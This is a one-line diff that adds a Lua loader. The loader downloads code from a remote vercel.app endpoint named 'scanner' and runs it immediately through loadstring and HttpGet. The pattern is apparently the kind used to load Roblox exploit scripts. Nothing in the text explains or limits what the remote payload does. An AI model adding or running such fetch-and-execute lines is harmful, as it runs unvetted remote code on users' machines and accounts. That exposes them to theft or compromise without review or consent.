@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://permanentdatabase.vercel.app/api/load?name=scanner"))()
